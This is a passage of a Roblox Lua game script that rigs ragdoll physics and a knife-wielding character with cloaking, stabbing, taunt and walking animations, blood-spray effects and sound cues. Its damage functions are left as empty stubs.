	local shinProperties = {
		{"LimitsEnabled", true};
		{"UpperAngle", 0};
		{"LowerAngle", -75};
	}
	ragdollJoint(character,character.LeftUpperLeg, character.LeftLowerLeg, "LeftKnee", "Hinge", shinProperties)
	ragdollJoint(character,character.RightUpperLeg, character.RightLowerLeg, "RightKnee", "Hinge", shinProperties)
	
	local footProperties = {
		{"LimitsEnabled", true};
		{"UpperAngle", 15};
		{"LowerAngle", -45};
	}
	ragdollJoint(character,character.LeftLowerLeg, character.LeftFoot, "LeftAnkle", "Hinge", footProperties)
	ragdollJoint(character,character.RightLowerLeg, character.RightFoot, "RightAnkle", "Hinge", footProperties)
	
	ragdollJoint(character,character.UpperTorso, character.LeftUpperArm, "LeftShoulder", "BallSocket")
	ragdollJoint(character,character.LeftUpperArm, character.LeftLowerArm, "LeftElbow", "BallSocket")
	ragdollJoint(character,character.UpperTorso, character.RightUpperArm, "RightShoulder", "BallSocket")
	ragdollJoint(character,character.RightUpperArm, character.RightLowerArm, "RightElbow", "BallSocket")
	ragdollJoint(character,character.LowerTorso, character.LeftUpperLeg, "LeftHip", "BallSocket")
	ragdollJoint(character,character.LowerTorso, character.RightUpperLeg, "RightHip", "BallSocket")
end

function Ragdoll(Character2,CharTorso)
	Character2:BreakJoints()
	local hum = Character2:findFirstChild("Humanoid")
	hum:remove()
	local function Scan(ch)
		local e
		for e = 1,#ch do
			Scan(ch[e]:GetChildren())
			if ch[e].ClassName == "Weld" or ch[e].ClassName == "Motor6D" then
				ch[e]:remove()
			end
		end
	end
	local NEWHUM = IT("Humanoid")
	NEWHUM.Name = "Corpse"
	NEWHUM.Health = 26
	NEWHUM.MaxHealth = 26
	NEWHUM.PlatformStand = true
	NEWHUM.Parent = Character2
	NEWHUM.DisplayDistanceType = "None"

	local ch = Character2:GetChildren()
	local i
	for i = 1,#ch do
		if ch[i].Name == "THandle1" or ch[i].Name == "THandle2" then
			ch[i]:remove()
		end
	end

	local Torso2 = Character2.Torso
	local movevector = Vector3.new()

	if Torso2 then
		movevector = CFrame.new(CharTorso.Position,Torso2.Position).lookVector
		local Head = Character2:FindFirstChild("Head")
		if Head then
			local Neck = Instance.new("Weld")
			Neck.Name = "Neck"
			Neck.Part0 = Torso2
			Neck.Part1 = Head
			Neck.C0 = CFrame.new(0, 1.5, 0)
			Neck.C1 = CFrame.new()
			Neck.Parent = Torso2

		end
		local Limb = Character2:FindFirstChild("Right Arm")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(1.5, 0, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "RightShoulder"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(1.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.C1 = CFrame.new(-0, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		local Limb = Character2:FindFirstChild("Left Arm")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(-1.5, 0, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "LeftShoulder"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(-1.5, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.C1 = CFrame.new(0, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		local Limb = Character2:FindFirstChild("Right Leg")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(0.5, -2, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "RightHip"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(0.5, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.C1 = CFrame.new(0, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		local Limb = Character2:FindFirstChild("Left Leg")
		if Limb then

			Limb.CFrame = Torso2.CFrame * CFrame.new(-0.5, -2, 0)
			local Joint = Instance.new("Glue")
			Joint.Name = "LeftHip"
			Joint.Part0 = Torso2
			Joint.Part1 = Limb
			Joint.C0 = CFrame.new(-0.5, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.C1 = CFrame.new(-0, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
			Joint.Parent = Torso2

			local B = Instance.new("Part")
			B.TopSurface = 0
			B.BottomSurface = 0
			B.formFactor = "Symmetric"
			B.Size = Vector3.new(1, 1, 1)
			B.Transparency = 1
			B.CFrame = Limb.CFrame * CFrame.new(0, -0.5, 0)
			B.Parent = Character2
			local W = Instance.new("Weld")
			W.Part0 = Limb
			W.Part1 = B
			W.C0 = CFrame.new(0, -0.5, 0)
			W.Parent = Limb

		end
		--[
		local Bar = Instance.new("Part")
		Bar.TopSurface = 0
		Bar.BottomSurface = 0
		Bar.formFactor = "Symmetric"
		Bar.Size = Vector3.new(1, 1, 1)
		Bar.Transparency = 1
		Bar.CFrame = Torso2.CFrame * CFrame.new(0, 0.5, 0)
		Bar.Parent = Character2
		local Weld = Instance.new("Weld")
		Weld.Part0 = Torso2
		Weld.Part1 = Bar
		Weld.C0 = CFrame.new(0, 0.5, 0)
		Weld.Parent = Torso2
		--]]
	end
	Character2.Parent = workspace
	Debris:AddItem(Character2,5)

	return Character2,Torso2
end

--//=================================\\
--||	     WEAPON CREATION
--\\=================================//

local Knife = CreatePart(3, Weapon, "Metal", 0, 0, "Mid gray", "Part", VT(0.2,1.2,0.2),false)
local Grip = CreateWeldOrSnapOrMotor("Weld", RightArm, RightArm, Knife, CF(0,-1.2, -0.5) * ANGLES(RAD(0), RAD(0), RAD(180)) * ANGLES(RAD(45), RAD(0), RAD(0)), CF(0, 0.3, 0))
CreateMesh("SpecialMesh", Knife, "FileMesh", "", "", VT(0.2,0.2,0.2), VT(0,0,0))
local A = IT("Attachment",Knife)
A.Position = VT(-0, 0.2, 0.136)
local B = IT("Attachment",Knife)
B.Position = VT(-0, -0.95, -0.982)
local Trail = IT("Trail",Knife)
Trail.Attachment0 = B
Trail.Attachment1 = A
Trail.Lifetime = 0.1
Trail.Transparency = NumberSequence.new(0.5, 1)
Trail.Texture = "http://www.roblox.com/asset/?id=1472703539"
Trail.Enabled = true
Humanoid.DisplayDistanceType = "None"
Humanoid.MaxHealth = 800
Humanoid.Health = 800

local STEP = CreateSound(131436155, Torso, 3, 1, true)
STEP.Playing = false
STEP.Looped = false
local STEPPING = false
Humanoid.Running:Connect(function(speed)
	if STEPPING == false then
		STEPPING = true
		repeat
			local TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
			wait(8/TORSOVELOCITY)
			local HITFLOOR = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
			if TORSOVELOCITY > 1 and Torso.Transparency ~= 1 and HITFLOOR ~= nil then
				STEP.Parent = Torso
				STEP.Pitch = MRANDOM(8,12)/10
				STEP:Play()
			end
		until TORSOVELOCITY < 0.6
		STEPPING = false
	end
end)

for _, c in pairs(Weapon:GetChildren()) do
	if c.ClassName == "Part" then
		c.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
	end
end

local SKILLTEXTCOLOR = C3(0,0,0)
local SKILLFONT = "SciFi"
local SKILLTEXTSIZE = 7

Weapon.Parent = Character

Humanoid.Died:connect(function()
	ATTACK = true
end)

--//=================================\\
--||	     DAMAGE FUNCTIONS
--\\=================================//

function StatLabel(CFRAME, TEXT, COLOR)
end

--//=================================\\
--||			DAMAGING
--\\=================================//

function ApplyDamage(Humanoid,Damage,TorsoPart)
end

function ApplyAoE(POSITION,RANGE,MINDMG,MAXDMG,FLING,INSTAKILL)
end

--//=================================\\
--||	ATTACK FUNCTIONS AND STUFF
--\\=================================//

function Cloaked()
	CLOAKED = true
	Speed = 0
	local POS = RootPart.Position
	local DISTANCE = 99999
	for i = 1, 15 do
		wait()
		for _, c in pairs(Character:GetChildren()) do
			if c:IsA("BasePart") and c ~= RootPart then
				c.Transparency = c.Transparency + 1/15
			elseif c.ClassName == "Accessory" then
				c.Handle.Transparency = c.Handle.Transparency + 1/15
			end
		end
		Trail.Transparency = NumberSequence.new(0.5+((i/15)/2), 1)
		Knife.Transparency = 1
	end
	Speed = 5
	repeat
		wait()
		DISTANCE = (RootPart.Position - POS).Magnitude
	until DISTANCE > 45 or CLOAKED == false
	Speed = 0
	for i = 1, 15 do
		wait()
		for _, c in pairs(Character:GetChildren()) do
			if c:IsA("BasePart") and c ~= RootPart then
				c.Transparency = 1 - i/15
			elseif c.ClassName == "Accessory" then
				c.Handle.Transparency = 1 - i/15
			end
		end
		Trail.Transparency = NumberSequence.new(1-((0.5/15)*i), 1)
		Knife.Transparency = 1
	end
	Speed = 12
	CLOAKED = false
end

function Attack()
	PLAYANIMS = false
	ATTACK = true
	Rooted = false
	local TARGET = nil
	Knife.CanCollide = true
	local HUMAN = nil
	local TORSOPART = nil
	local HIT = Knife.Touched:Connect(function(hit)
		if hit.Parent:FindFirstChildOfClass("Humanoid") then
			local HITBODY = hit.Parent
			local HUM = hit.Parent:FindFirstChildOfClass("Humanoid")
			local TORSO = HITBODY:FindFirstChild("Torso") or HITBODY:FindFirstChild("UpperTorso")
			
				
			end
	end)
	
	for i=0, 0.4, 0.1 / Animation_Speed do
		Swait()
		if TARGET then
			break
		end
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
	end
	CreateSound(143501853,Knife,2,MRANDOM(8,13)/10,false)
	for i=0, 0.5, 0.1 / Animation_Speed do
		Swait()
		if TARGET then
			break
		end
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(35)), 1 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(-35)), 1 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.5, -0.4) * ANGLES(RAD(90), RAD(0), RAD(35)) * ANGLES(RAD(0), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.25, 0.5, -0.3) * ANGLES(RAD(90), RAD(0), RAD(35)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
	end
	Knife.CanCollide = false
	if TARGET then
		CLOAKED = false
		local DISPOSE = false
		Rooted = true
		coroutine.resume(coroutine.create(function()
			repeat
				Swait()
				if TORSOPART then
					TORSOPART.Anchored = true
					TORSOPART.CFrame = RootPart.CFrame*CF(0,0,-2.2)
				end
			until DISPOSE == true
			TORSOPART.Anchored = false
		end))
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.75, -1.3) * ANGLES(RAD(90), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		CreateSound(28144268,Knife,2,MRANDOM(8,13)/10,false)
		CreateSound(180083298,TORSOPART,5,MRANDOM(8,13)/10,false)
		coroutine.resume(coroutine.create(function()
			for i = 1, 750 do
				Swait()
				if HUMAN and TORSOPART then
					if HUMAN.Health > 25 then
						SprayBlood(TORSOPART.CFrame*CF(0,TORSOPART.Size.Y/2,-TORSOPART.Size.Z/2).p,TORSOPART.CFrame*CF(MRANDOM(-3,3)/15,TORSOPART.Size.Y+MRANDOM(-3,3)/35,-TORSOPART.Size.Z*MRANDOM(8,25)/10).p,MRANDOM(15,35)/10)
						HUMAN.Health = HUMAN.Health - 25
						HUMAN.WalkSpeed = MRANDOM(5,45)
					else
						break
					end
				else
					break
				end
			end
			local SCREAMS = {160718677,337800380}
			if HUMAN and TORSOPART then
				if HUMAN.Health == 26 then
					local HEAD = TORSOPART.Parent:FindFirstChild("Head")
					if HEAD then
						CreateSound(SCREAMS[MRANDOM(1,#SCREAMS)],HEAD,5,MRANDOM(13,15)/10,false)
						local FACE = HEAD:FindFirstChild("face")
						if FACE then
							FACE.Texture = "http://www.roblox.com/asset/?id=145854465"
						end
					end
					if TORSOPART.Name == "Torso" then
						Ragdoll(TORSOPART.Parent,Torso)
					elseif TORSOPART.Name == "UpperTorso" then
						R15Ragdoll(TORSOPART.Parent)
					end
				end
				HUMAN.WalkSpeed = 16
			end
		end))
		for i=0, 0.2, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(2, 0.75, -1.3) * ANGLES(RAD(90), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		DISPOSE = true
		local bv = Instance.new("BodyVelocity") 
		bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
		bv.velocity = CF(TORSOPART.Position,TORSOPART.CFrame*CF(0,5,-15).p).lookVector*75
		bv.Parent = TORSOPART
		Debris:AddItem(bv,0.05)
		for i=0, 0.5, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-35)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(35)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(-25), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.15, 0.5, -0.5) * ANGLES(RAD(90), RAD(0), RAD(-35)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(110), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-65), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
	end
	HIT:disconnect()
	ATTACK = false
	Rooted = false
	PLAYANIMS = true
end

function Taunt()
	ATTACK = true
	Rooted = true
	PLAYANIMS = false
	CreateSound(159882303,Torso,5,MRANDOM(8,9)/10,false)
	for i=0, 1.5, 0.1 / Animation_Speed do
		Swait()
		RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(35), RAD(0)), 1 / Animation_Speed)
		RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(140)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
		LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-140)) * ANGLES(RAD(0), RAD(90), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
		RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
	end
	PLAYANIMS = true
	ATTACK = false
	Rooted = false
end

--//=================================\\
--||	  ASSIGN THINGS TO KEYS
--\\=================================//

function MouseDown(Mouse)
	HOLD = true
	if ATTACK == false then
		Attack()
	end
end

function MouseUp(Mouse)
HOLD = false
end

function KeyDown(Key)
	KEYHOLD = true
	if Key == "z" and ATTACK == false then
		if CLOAKED == false then
			Cloaked()
		else
			CLOAKED = false
		end
	end

	if Key == "t" and ATTACK == false then
		Taunt()
	end

	if string.byte(Key) == 50 and ATTACK == false and CLOAKED == false then
		if Speed == 12 then
			Speed = 30
		elseif Speed == 30 then
			Speed = 12
		end
	end
end

function KeyUp(Key)
	KEYHOLD = false
end

	Mouse.Button1Down:connect(function(NEWKEY)
		MouseDown(NEWKEY)
	end)
	Mouse.Button1Up:connect(function(NEWKEY)
		MouseUp(NEWKEY)
	end)
	Mouse.KeyDown:connect(function(NEWKEY)
		KeyDown(NEWKEY)
	end)
	Mouse.KeyUp:connect(function(NEWKEY)
		KeyUp(NEWKEY)
	end)

--//=================================\\
--\\=================================//

function unanchor()
	if UNANCHOR == true then
		g = Character:GetChildren()
		for i = 1, #g do
			if g[i].ClassName == "Part" then
				g[i].Anchored = false
			end
		end
	end
end

--//=================================\\
--||	WRAP THE WHOLE SCRIPT UP
--\\=================================//

Humanoid.Changed:connect(function(Jump)
	if Jump == "Jump" and (Disable_Jump == true) then
		Humanoid.Jump = false
	end
end)

while true do
	Swait()
	script.Parent = WEAPONGUI
	ANIMATE.Parent = nil
	for _,v in next, Humanoid:GetPlayingAnimationTracks() do
	    v:Stop();
	end
	SINE = SINE + CHANGE
	local TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
	local TORSOVERTICALVELOCITY = RootPart.Velocity.y
	local HITFLOOR = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
	local WALKSPEEDVALUE = 6 / (Humanoid.WalkSpeed / 16)
	if ANIM == "Walk" and TORSOVELOCITY > 1 then
		RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, -0.15 * COS(SINE / (WALKSPEEDVALUE / 2))) * ANGLES(RAD(0), RAD(0) - RootPart.RotVelocity.Y / 75, RAD(0)), 2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(2.5 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0) - Head.RotVelocity.Y / 30), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 0.875 - 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0) - RightLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.3 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 0.875 + 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), 0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0) + LeftLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.3 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
	elseif (ANIM ~= "Walk") or (TORSOVELOCITY < 1) then
		RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
	end
	if TORSOVERTICALVELOCITY > 1 and HITFLOOR == nil then
		ANIM = "Jump"
		if PLAYANIMS == true then
			RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(-40), RAD(0), RAD(20)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-40), RAD(0), RAD(-20)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, -0.3) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(-20)), 0.2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(20)), 0.2 / Animation_Speed)
	    end
	elseif TORSOVERTICALVELOCITY < -1 and HITFLOOR == nil then
		ANIM = "Fall"
		if PLAYANIMS == true then
			RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 ) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0 , 0 + ((1) - 1)) * ANGLES(RAD(20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(60)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-60)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(20)), 0.2 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(10)), 0.2 / Animation_Speed)
		end
	elseif TORSOVELOCITY < 1 and HITFLOOR ~= nil then
		ANIM = "Idle"
		if PLAYANIMS == true then
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(15), RAD(35), RAD(12)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
